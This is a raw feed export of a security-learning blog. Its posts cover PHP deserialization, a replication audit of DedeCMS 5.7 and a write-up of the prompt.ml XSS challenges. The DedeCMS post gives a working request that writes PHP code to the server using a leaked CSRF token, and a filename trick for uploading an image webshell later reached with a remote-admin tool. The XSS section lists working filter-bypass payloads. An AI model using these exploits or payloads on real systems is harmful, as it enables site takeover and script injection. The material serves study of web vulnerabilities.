class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">maniac</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="keyword">new</span> x2();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">x2</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $test2 = <span class="string">"phpinfo();"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $val = <span class="keyword">new</span> maniac();</span><br><span class="line">    print_r(serialize($val));</span><br></pre></td></tr></table></figure><p><img src="/images/xulihua/1584884501054.png" alt="1584884501054"></p><p><img src="/images/xulihua/1584884638198.png" alt="1584884638198"></p><p>参考博客</p><p><a href="https://www.cnblogs.com/piaomiaohongchen/p/10923067.html" target="_blank" rel="noopener">https://www.cnblogs.com/piaomiaohongchen/p/10923067.html</a></p><p> <a href="https://xz.aliyun.com/t/7366" target="_blank" rel="noopener">https://xz.aliyun.com/t/7366</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;serialize:serialize()返回的是字符串，方便存储和传递PHP的值。&lt;/p&gt;
&lt;p&gt;unserialize:就是将已经序列化的字符串转化为php的值。&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td clas
      
    
    </summary>
    
      <category term="web安全" scheme="http://onekingcc.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计之DedeCMS（复现）</title>
    <link href="http://onekingcc.github.io/2020/02/04/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BDedeCMS%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89/"/>
    <id>http://onekingcc.github.io/2020/02/04/代码审计之DedeCMS（复现）/</id>
    <published>2020-02-03T16:00:00.000Z</published>
    <updated>2020-11-14T06:53:49.667Z</updated>
    
    <content type="html"><![CDATA[<p>今日在安全客看见了一个Dedecms的文章，最近刚好学习代码审计故依葫芦画瓢审计一波。</p><h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p>版本：php5.6.27+mysql</p><p>对象：Dedecms5.7.72</p><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>直接定位到dede/tpl.php重要代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/config.php"</span>);</span><br><span class="line">CheckPurview(<span class="string">'plus_文件管理器'</span>);</span><br><span class="line"></span><br><span class="line">$action = <span class="keyword">isset</span>($action) ? trim($action) : <span class="string">''</span>;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($filename))    $filename = <span class="string">''</span>;</span><br><span class="line">$filename = preg_replace(<span class="string">"#[//////]#"</span>, <span class="string">''</span>, $filename);</span><br><span class="line">......</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($action==<span class="string">'savetagfile'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    csrf_check();</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"#^[a-z0-9_-]&#123;1,&#125;/.lib/.php$#i"</span>, $filename))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">'文件名不合法，不允许进行操作！'</span>, <span class="string">'-1'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">'/oxwindow.class.php'</span>);</span><br><span class="line">    $tagname = preg_replace(<span class="string">"#/.lib/.php$#i"</span>, <span class="string">""</span>, $filename);</span><br><span class="line">    $content = stripslashes($content);</span><br><span class="line">    $truefile = DEDEINC.<span class="string">'/taglib/'</span>.$filename;</span><br><span class="line">    $fp = fopen($truefile, <span class="string">'w'</span>);</span><br><span class="line">    fwrite($fp, $content);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里发现$content经过stripslashes()处理后写入/include/taglib/xxx.lib.php文件中，这里dedecms是的register_globals=on所以这里$filename和$content可以控制，当$action=savetagfile时就调用csrf-check()函数检查这里跟进这个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($token) || strcasecmp($token, $_SESSION[<span class="string">'token'</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="http://bbs.dedecms.com/907721.html"&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对token的值进行验证，验证token的值和session里面值是否相等这里需要追踪变量$token看值在哪里获取的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">else if ($action == &apos;upload&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    require_once(dirname(__FILE__).&apos;/../include/oxwindow.class.php&apos;);</span><br><span class="line">    $acdir = str_replace(&apos;.&apos;, &apos;&apos;, $acdir);</span><br><span class="line">    $win = new OxWindow();</span><br><span class="line">    make_hash();</span><br><span class="line">    $win-&gt;Init(&quot;tpl.php&quot;,&quot;js/blank.js&quot;,&quot;POST&apos; enctype=&apos;multipart/form-data&apos; &quot;);</span><br><span class="line">    $win-&gt;mainTitle = &quot;模块管理&quot;;</span><br><span class="line">    $wecome_info = &quot;&lt;a href=&apos;templets_main.php&apos;&gt;模板管理&lt;/a&gt; &amp;gt;&amp;gt; 上传模板&quot;;</span><br><span class="line">    $win-&gt;AddTitle(&apos;请选择要上传的文件:&apos;);</span><br><span class="line">    $win-&gt;AddHidden(&quot;action&quot;,&apos;uploadok&apos;);</span><br><span class="line">    $msg = &quot;</span><br><span class="line">    &lt;table width=&apos;600&apos; border=&apos;0&apos; cellspacing=&apos;0&apos; cellpadding=&apos;0&apos;&gt;</span><br><span class="line">  &lt;tr&gt;</span><br><span class="line">    &lt;td width=&apos;96&apos; height=&apos;60&apos;&gt;请选择文件：&lt;/td&gt;</span><br><span class="line">    &lt;td width=&apos;504&apos;&gt;</span><br><span class="line">        &lt;input name=&apos;acdir&apos; type=&apos;hidden&apos; value=&apos;$acdir&apos;  /&gt;</span><br><span class="line">        &lt;input name=&apos;token&apos; type=&apos;hidden&apos; value=&apos;&#123;$_SESSION[&apos;token&apos;]&#125;&apos;  /&gt;</span><br><span class="line">        &lt;input name=&apos;upfile&apos; type=&apos;file&apos; id=&apos;upfile&apos; style=&apos;width:380px&apos; /&gt;</span><br><span class="line">      &lt;/td&gt;</span><br><span class="line">  &lt;/tr&gt;</span><br><span class="line"> &lt;/table&gt;</span><br></pre></td></tr></table></figure><p>这里我们发现当action=upload时token的值存在表单里面隐藏起了，这时访问</p><p><img src="/images/daimashenji/1580718668811.png" alt="1580718668811"></p><p>这时已经拿到token的值，这里回到代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$tagname = preg_replace(<span class="string">"#/.lib/.php$#i"</span>, <span class="string">""</span>, $filename);</span><br><span class="line">   $content = stripslashes($content);</span><br><span class="line">   $truefile = DEDEINC.<span class="string">'/taglib/'</span>.$filename;</span><br><span class="line">   $fp = fopen($truefile, <span class="string">'w'</span>);</span><br><span class="line">   fwrite($fp, $content);</span><br><span class="line">   fclose($fp);</span><br></pre></td></tr></table></figure><p>梳理一下首先这里$content和$filename是可控的，然后我们构造filename的格式 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$tagname = preg_replace(&quot;#/.lib/.php$#i&quot;, &quot;&quot;, $filename)</span><br></pre></td></tr></table></figure><p>这里格式是xxx.lib.php的格式保存的也是php，然后$content直接写入，很明确了直接写php内容我们直接任意我们直接访问<a href="http://localhost/DedeCMS-5.7.72/uploads/dede/tpl.php?action=savetagfile&amp;filename=oneking.lib.php&amp;content=%3C?php%20phpinfo();?%3E&amp;token=30237900e75f9609ab56a76fa2580777然后我们进入include/taglib/onekingcc.lib.php已经生成" target="_blank" rel="noopener">http://localhost/DedeCMS-5.7.72/uploads/dede/tpl.php?action=savetagfile&amp;filename=oneking.lib.php&amp;content=%3C?php%20phpinfo();?%3E&amp;token=30237900e75f9609ab56a76fa2580777然后我们进入include/taglib/onekingcc.lib.php已经生成</a></p><p><img src="/images/daimashenji/1580720825563.png" alt="1580720825563"></p><p><img src="/images/daimashenji/1580720742775.png" alt="1580720976907"></p><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>在include/dialog/select_images_post.php路径下发现如下代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/config.php"</span>);</span><br><span class="line"><span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">"/../image.func.php"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($activepath))</span><br><span class="line">&#123;</span><br><span class="line">    $activepath =<span class="string">''</span>;</span><br><span class="line">    $activepath = str_replace(<span class="string">'.'</span>, <span class="string">''</span>, $activepath);</span><br><span class="line">    $activepath = preg_replace(<span class="string">"#//&#123;1,&#125;#"</span>, <span class="string">'/'</span>, $activepath);</span><br><span class="line">    <span class="keyword">if</span>(strlen($activepath) &lt; strlen($cfg_image_dir))</span><br><span class="line">    &#123;</span><br><span class="line">        $activepath = $cfg_image_dir;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($imgfile))</span><br><span class="line">&#123;</span><br><span class="line">    $imgfile=<span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!is_uploaded_file($imgfile))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">"你没有选择上传的文件!"</span>.$imgfile, <span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$CKEditorFuncNum = (<span class="keyword">isset</span>($CKEditorFuncNum))? $CKEditorFuncNum : <span class="number">1</span>;</span><br><span class="line">$imgfile_name = trim(preg_replace(<span class="string">"#[ /r/n/t/*/%/////?&gt;&lt;/|/"</span>:]&#123;<span class="number">1</span>,&#125;<span class="comment">#", '', $imgfile_name));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"#/.("</span>.$cfg_imgtype.<span class="string">")#i"</span>, $imgfile_name))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">"你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！"</span>, <span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$nowtme = time();</span><br><span class="line">$sparr = <span class="keyword">Array</span>(<span class="string">"image/pjpeg"</span>, <span class="string">"image/jpeg"</span>, <span class="string">"image/gif"</span>, <span class="string">"image/png"</span>, <span class="string">"image/xpng"</span>, <span class="string">"image/wbmp"</span>);</span><br><span class="line">$imgfile_type = strtolower(trim($imgfile_type));</span><br><span class="line"><span class="keyword">if</span>(!in_array($imgfile_type, $sparr))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">"上传的图片格式错误，请使用JPEG、GIF、PNG、WBMP格式的其中一种！"</span>,<span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们着重看一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$imgfile_name = trim(preg_replace(<span class="string">"#[ /r/n/t/*/%/////?&gt;&lt;/|/"</span>:]&#123;<span class="number">1</span>,&#125;<span class="comment">#", '', $imgfile_name));</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">"#/.("</span>.$cfg_imgtype.<span class="string">")#i"</span>, $imgfile_name))</span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">"你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！"</span>, <span class="string">"-1"</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对上传的图片名字$imgfile_name做一个替换，替换之后使用pre_match正则匹配，$imgfile_name是否存在$cfg_imgtype这里查看文件名只要存在jpg，gif，png就可以绕过，这样就可以使用123.p*hp绕过还有%，？，&lt;&gt;，：都可以绕过。</p><p><img src="/images/daimashenji/1580742590325.png" alt="1580742590325"></p><p>这里提前准备一个图片马然后在发表文章处</p><p><img src="/images/daimashenji/1580791380853.png" alt="1580791380853"></p><p>发现成功上传但是没有返回路径</p><p><img src="/images/daimashenji/1580793500115.png" alt="1580793500115"></p><p>这里利用一个 正常的发现可以成功返回路径</p><p><img src="/images/daimashenji/1580791705018.png" alt="1580791705018"></p><p>然后访问：</p><p><a href="http://local.test.com/DedeCMS-5.7.72/uploads/uploads/allimg/200204/" target="_blank" rel="noopener">http://local.test.com/DedeCMS-5.7.72/uploads/uploads/allimg/200204/</a></p><p><img src="/images/daimashenji/1580792057512.png" alt="1580792057512"></p><p><img src="/images/daimashenji/1580793801501.png" alt="1580793801501"></p><p>然后用菜刀直接连接</p><p><img src="/images/daimashenji/1580794047767.png" alt="1580794047767"></p><p>参考链接：</p><p><a href="https://www.anquanke.com/post/id/157522" target="_blank" rel="noopener">https://www.anquanke.com/post/id/157522</a></p><p><a href="https://www.freebuf.com/vuls/164035.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/164035.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今日在安全客看见了一个Dedecms的文章，最近刚好学习代码审计故依葫芦画瓢审计一波。&lt;/p&gt;
&lt;h3 id=&quot;环境：&quot;&gt;&lt;a href=&quot;#环境：&quot; class=&quot;headerlink&quot; title=&quot;环境：&quot;&gt;&lt;/a&gt;环境：&lt;/h3&gt;&lt;p&gt;版本：php5.6.27+my
      
    
    </summary>
    
      <category term="代码审计" scheme="http://onekingcc.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS Challenge</title>
    <link href="http://onekingcc.github.io/2019/12/20/XSS%20Challenge/"/>
    <id>http://onekingcc.github.io/2019/12/20/XSS Challenge/</id>
    <published>2019-12-19T16:00:00.000Z</published>
    <updated>2020-11-14T06:53:23.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS-Challenge"><a href="#XSS-Challenge" class="headerlink" title="XSS Challenge"></a>XSS Challenge</h2><pre><code>今天无意中看见这个然后顺便做了一下，学到了很多，这里只是想记录一下做题的心得，当然有大佬早就写了write up可以看，从中真的会学到很多东西。</code></pre><p><strong>题目地址:<a href="http://prompt.ml/" target="_blank" rel="noopener">http://prompt.ml/</a></strong></p><h3 id="challenge-0"><a href="#challenge-0" class="headerlink" title="challenge 0"></a>challenge 0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// warm up</span></span><br><span class="line">    <span class="comment">// script should be executed without user interaction</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input type="text" value="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里没有任何过滤payload：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;img src = x onerror=prompt(1)&gt;</span></span><br></pre></td></tr></table></figure><h3 id="chanllenge-1"><a href="#chanllenge-1" class="headerlink" title="chanllenge 1"></a>chanllenge 1</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// tags stripping mechanism from ExtJS library</span></span><br><span class="line">    <span class="comment">// Ext.util.Format.stripTags</span></span><br><span class="line">    <span class="keyword">var</span> stripTagsRE = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>;</span><br><span class="line">    input = input.replace(stripTagsRE, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;article&gt;'</span> + input + <span class="string">'&lt;/article&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>var stripTagsRE = /&lt;\/?[^&gt;]+&gt;/gi;</code>匹配&lt;&gt;包裹的内容把里面的东西relpace为空，然后过滤<strong>&gt;</strong>如果是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>会变成alert(1),所以这里的思路就是不去闭合，让浏览器去容错处理</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">prompt(1)//</span></span></span><br></pre></td></tr></table></figure><h3 id="challenge-2"><a href="#challenge-2" class="headerlink" title="challenge 2"></a>challenge 2</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//                      v-- frowny face</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[=(]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ok seriously, disallows equal signs and open parenthesis</span></span><br><span class="line">    <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的将<strong>= 和(</strong>替换掉，这样常规的就会过不了  这里想到的是利用ES6通过模板字符串的标签模板，<code>&lt;script&gt;prompt&#39;1&#39;&lt;/script&gt;</code></p><p>但是还是没有弹，最后查了一下，这样传进去的是 *<em>字符串 *</em><code>&lt;script&gt;prompt.call${1}&lt;/script&gt;</code>不过最后也没弹，就换了种思路看看能不能试试编码，这里学到新知识，由于在xml特性中svg向量里面包含script标签元素，就会先对xml进行解析，然后这里通过编码 或者进制进行绕过，&amp;#40十进制，在html实体编码时会被还原成（</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt&amp;#40;1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="challenge-3"><a href="#challenge-3" class="headerlink" title="challenge 3"></a>challenge 3</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function escape(input) &#123;</span><br><span class="line">    // filter potential comment end delimiters</span><br><span class="line">    input = input.replace(/-&gt;/g, &apos;_&apos;);</span><br><span class="line"></span><br><span class="line">    // comment the input to avoid script execution</span><br><span class="line">    return &apos;&lt;!-- &apos; + input + &apos; --&gt;&apos;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里过滤了<strong>-&gt;</strong>可以用条件注释–!</p><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--!&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span></span></span><br></pre></td></tr></table></figure><h3 id="challenge-4"><a href="#challenge-4" class="headerlink" title="challenge 4"></a>challenge 4</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// make sure the script belongs to own site</span></span><br><span class="line">    <span class="comment">// sample script: http://prompt.ml/js/test.js</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="regexp">/^(?:https?:)?\/\/prompt\.ml\//i</span>.test(<span class="built_in">decodeURIComponent</span>(input))) &#123;</span><br><span class="line">        <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">        script.src = input;</span><br><span class="line">        <span class="keyword">return</span> script.outerHTML;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid resource.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要用伪造url绕，访问的带有用户名，密码保护的url来伪造不过怎么构造好像也不行。</p><h3 id="challenge-5"><a href="#challenge-5" class="headerlink" title="challenge 5"></a>challenge 5</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/&gt;|on.+?=|focus/gi<code>替换了</code>&gt;<code>、</code>onxxxx=<code>和</code>focus这里采用换行的方式绕过</p><p>payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">"  type=image  src  onerror </span><br><span class="line">=" prompt(1)</span><br></pre></td></tr></table></figure><h3 id="challenge-6"><a href="#challenge-6" class="headerlink" title="challenge 6"></a>challenge 6</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span 